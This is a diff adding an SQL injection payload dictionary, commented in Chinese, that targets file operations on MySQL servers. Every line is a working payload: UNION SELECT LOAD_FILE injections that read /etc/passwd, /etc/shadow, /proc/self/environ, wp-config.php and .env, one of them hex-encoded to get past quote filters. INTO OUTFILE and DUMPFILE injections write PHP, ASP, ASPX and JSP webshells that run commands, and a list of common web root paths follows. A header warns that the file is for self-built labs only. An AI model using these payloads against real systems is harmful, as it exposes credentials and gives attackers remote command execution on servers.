@@ -1,0 +1,89 @@
+# ============================================================
+# SQL Injection Payload Dictionary — 10 文件操作类（高危）
+# 用途: 读取服务器文件 / 写入 webshell
+# 适用: 仅限 MySQL root 权限或高级别用户
+# 条件: @@secure_file_priv 不为 NULL
+# 警告: 仅用于自建靶场！未经授权使用违法！
+# ============================================================
+
+# ========== 读取文件 — LOAD_FILE() ==========
+
+# Linux 系统文件
+UNION SELECT 1,LOAD_FILE('/etc/passwd'),N--
+UNION SELECT 1,LOAD_FILE('/etc/hosts'),N--
+UNION SELECT 1,LOAD_FILE('/etc/hostname'),N--
+UNION SELECT 1,LOAD_FILE('/etc/issue'),N--
+UNION SELECT 1,LOAD_FILE('/etc/shadow'),N--
+UNION SELECT 1,LOAD_FILE('/proc/self/environ'),N--
+UNION SELECT 1,LOAD_FILE('/proc/version'),N--
+UNION SELECT 1,LOAD_FILE('/proc/1/cmdline'),N--
+UNION SELECT 1,LOAD_FILE('/proc/net/tcp'),N--
+UNION SELECT 1,LOAD_FILE('/var/log/apache2/access.log'),N--
+UNION SELECT 1,LOAD_FILE('/var/log/apache2/error.log'),N--
+UNION SELECT 1,LOAD_FILE('/var/log/nginx/access.log'),N--
+UNION SELECT 1,LOAD_FILE('/var/log/nginx/error.log'),N--
+UNION SELECT 1,LOAD_FILE('/var/log/mysql/error.log'),N--
+
+# Web 应用配置文件
+UNION SELECT 1,LOAD_FILE('/var/www/html/index.php'),N--
+UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),N--
+UNION SELECT 1,LOAD_FILE('/var/www/html/wp-config.php'),N--
+UNION SELECT 1,LOAD_FILE('/var/www/html/.env'),N--
+UNION SELECT 1,LOAD_FILE('/var/www/html/.htaccess'),N--
+
+# Windows 系统文件
+UNION SELECT 1,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),N--
+UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),N--
+UNION SELECT 1,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),N--
+UNION SELECT 1,LOAD_FILE('C:\\inetpub\\wwwroot\\web.config'),N--
+UNION SELECT 1,LOAD_FILE('C:\\inetpub\\wwwroot\\index.aspx'),N--
+
+# 十六进制读取（绕过引号过滤）
+UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),N--
+
+# ========== 写入 webshell — INTO OUTFILE ==========
+# 注意: INTO OUTFILE 必须在 UNION SELECT 末尾，不能有注释
+# 需要知道 Web 目录的绝对路径
+
+# PHP webshell
+UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 INTO OUTFILE '/var/www/html/shell.php'
+UNION SELECT 1,'<?php eval($_POST[1]);?>',3 INTO OUTFILE '/var/www/html/evil.php'
+UNION SELECT 1,'<?php echo shell_exec($_GET["c"]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'
+UNION SELECT 1,'<?php system($_REQUEST["c"]);?>',3 INTO OUTFILE '/var/www/html/rce.php'
+UNION SELECT 1,'<?=system($_GET["c"])?>',3 INTO OUTFILE '/var/www/html/s.php'
+UNION SELECT 1,'<?php phpinfo();?>',3 INTO OUTFILE '/var/www/html/info.php'
+
+# ASP webshell
+UNION SELECT 1,'<%Execute("cmd.exe /c "&request("cmd"))%>',3 INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.asp'
+UNION SELECT 1,'<%Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe /c "&request("c")).StdOut.ReadAll())%>',3 INTO OUTFILE 'C:\\inetpub\\wwwroot\\cmd.asp'
+
+# ASPX webshell
+UNION SELECT 1,'<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]).StandardOutput.ReadToEnd()); %>',3 INTO OUTFILE 'C:\\inetpub\\wwwroot\\cmd.aspx'
+
+# JSP webshell
+UNION SELECT 1,'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',3 INTO OUTFILE '/var/www/html/cmd.jsp'
+
+# 多文件写入（改路径）
+UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 INTO OUTFILE '/var/www/html/shell1.php'
+UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 INTO OUTFILE '/var/www/html/shell2.php'
+UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 INTO OUTFILE '/var/www/shell.php'
+
+# ========== 写入文件 — INTO DUMPFILE（不添加换行）==========
+# INTO DUMPFILE 不添加行终止符，适合写入二进制文件
+UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3 INTO DUMPFILE '/var/www/html/s.php'
+
+# ========== 文件路径探测常用位置 ==========
+# Linux 常见 Web 目录
+/var/www/html/
+/var/www/
+/var/www/site/
+/var/www/public/
+/var/www/htdocs/
+/usr/local/apache2/htdocs/
+/home/*/public_html/
+
+# Windows 常见 Web 目录
+C:\inetpub\wwwroot\
+C:\xampp\htdocs\
+C:\wamp\www\
+C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\
